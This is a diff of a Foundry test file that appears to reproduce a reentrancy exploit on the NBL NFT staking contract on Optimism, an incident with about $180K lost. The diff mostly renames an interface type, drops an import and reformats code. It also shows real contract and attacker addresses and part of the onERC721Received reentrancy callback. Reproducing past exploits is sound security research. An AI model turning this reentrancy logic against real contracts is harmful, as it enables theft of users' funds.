@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~$180K
 // Attacker : https://optimistic.etherscan.io/address/0x1fd0a6a5e232eeba8020a40535ad07013ec4ef12
@@ -49,7 +48,7 @@ contract ContractTest is Test {
     IERC20 private constant NBL = IERC20(0x4B03afC91295ed778320c2824bAd5eb5A1d852DD);
     IERC20 private constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
     IERC20 private constant WETH = IERC20(0x4200000000000000000000000000000000000006);
-    Uni_Pair_V3 private constant NBL_USDT = Uni_Pair_V3(0xfAF037caAfA9620bFAebc04C298Bf4A104963613);
+    IUniswapV3Pair private constant NBL_USDT = IUniswapV3Pair(0xfAF037caAfA9620bFAebc04C298Bf4A104963613);
     IRouterV3 private constant Router = IRouterV3(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
     INblNftStake private constant NblNftStake = INblNftStake(0x5499178919C79086fd580d6c5f332a4253244D91);
     address private constant exploiterEOA = 0x1FD0a6A5e232EebA8020A40535AD07013Ec4ef12;
@@ -115,12 +114,10 @@ contract ContractTest is Test {
         NBL.transfer(address(NBL_USDT), returnAmount + fee0);
     }
 
-    function onERC721Received(
-        address operator,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
-    ) external returns (bytes4) {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4)
+    {
         if (reenter) {
             reenter = false;
             NBF.transferFrom(address(this), address(NblNftStake), 737);
